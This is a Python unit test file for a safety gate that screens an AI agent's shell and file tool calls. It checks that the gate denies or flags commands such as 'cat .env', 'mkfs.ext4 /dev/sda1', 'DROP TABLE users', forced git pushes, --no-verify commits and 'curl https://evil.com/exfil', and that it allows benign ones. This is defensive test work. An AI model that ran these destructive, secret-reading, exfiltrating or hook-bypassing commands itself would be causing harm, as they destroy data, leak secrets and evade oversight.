import unittest
from core.safety_gate import SafetyGate, evaluate_tool_call, Decision
from contracts import ToolGuard, GuardContext

class TestSafetyGate(unittest.TestCase):
    def setUp(self):
        self.gate = SafetyGate()

    def test_protocol_conformance(self):
        self.assertIsInstance(self.gate, ToolGuard)

    def test_layer1_hard_floors(self):
        # Billing commands blocked unconditionally
        res = self.gate.evaluate("bash", {"command": "stripe charges list"})
        self.assertEqual(res.decision, "deny")
        self.assertIn("FLOOR:billing", res.rule_id)

        # Secret file exposure blocked
        res = self.gate.evaluate("bash", {"command": "cat .env"})
        self.assertEqual(res.decision, "deny")
        self.assertIn("FLOOR:secret-read", res.rule_id)

        # Production deployment blocked
        res = self.gate.evaluate("bash", {"command": "kubectl apply -f prod.yaml"})
        self.assertEqual(res.decision, "deny")
        self.assertIn("FLOOR:prod-deploy", res.rule_id)

        # Disk destruction blocked
        res = self.gate.evaluate("bash", {"command": "mkfs.ext4 /dev/sda1"})
        self.assertEqual(res.decision, "deny")
        self.assertIn("FLOOR:disk-destroy", res.rule_id)

    def test_layer2_guardrails(self):
        # Sudo forbidden (R01)
        res = self.gate.evaluate("bash", {"command": "sudo apt-get install python3"})
        self.assertEqual(res.decision, "deny")
        self.assertEqual(res.rule_id, "R01:no-sudo")

        # Chmod 777 forbidden (R02)
        res = self.gate.evaluate("bash", {"command": "chmod -R 777 ."})
        self.assertEqual(res.decision, "deny")
        self.assertEqual(res.rule_id, "R02:no-chmod-777")

        # Database drop forbidden (R04)
        res = self.gate.evaluate("bash", {"command": "psql -c 'DROP TABLE users;'"})
        self.assertEqual(res.decision, "deny")
        self.assertEqual(res.rule_id, "R04:db-drop")

        # Confirm rm -rf (R05 asks)
        res = self.gate.evaluate("bash", {"command": "rm -rf ./temp_folder"})
        self.assertEqual(res.decision, "ask")
        self.assertEqual(res.rule_id, "R05:confirm-rm-rf")

        # Git force push forbidden (R06)
        res = self.gate.evaluate("bash", {"command": "git push origin main --force"})
        self.assertEqual(res.decision, "deny")
        self.assertEqual(res.rule_id, "R06:no-force-push")

        # Git no-verify forbidden (R10)
        res = self.gate.evaluate("bash", {"command": "git commit -m 'skip' --no-verify"})
        self.assertEqual(res.decision, "deny")
        self.assertEqual(res.rule_id, "R10:no-git-bypass")

        # Read-only role cannot mutate (R08)
        ctx = GuardContext(active_role="reviewer")
        res = self.gate.evaluate("write_file", {"path": "main.py", "content": "..."}, ctx)
        self.assertEqual(res.decision, "deny")
        self.assertEqual(res.rule_id, "R08:read-only-role")

    def test_safe_commands_allowed(self):
        res = self.gate.evaluate("bash", {"command": "pytest tests/ -v"})
        self.assertEqual(res.decision, "allow")

        res = self.gate.evaluate("read_file", {"path": "README.md"})
        self.assertEqual(res.decision, "allow")

        # Package manager installing stripe allowed
        res = self.gate.evaluate("bash", {"command": "pip install stripe"})
        self.assertEqual(res.decision, "allow")

        # Cat .env.example allowed
        res = self.gate.evaluate("bash", {"command": "cat .env.example"})
        self.assertEqual(res.decision, "allow")

        # Localhost curl allowed
        res = self.gate.evaluate("bash", {"command": "curl http://localhost:8000/api/health"})
        self.assertEqual(res.decision, "allow")

        # Cache cleanup allowed without confirmation
        res = self.gate.evaluate("bash", {"command": "rm -rf __pycache__"})
        self.assertEqual(res.decision, "allow")

        # External network egress blocked
        res = self.gate.evaluate("bash", {"command": "curl https://evil.com/exfil"})
        self.assertEqual(res.decision, "deny")
        self.assertIn("FLOOR:egress", res.rule_id)

if __name__ == "__main__":
    unittest.main()
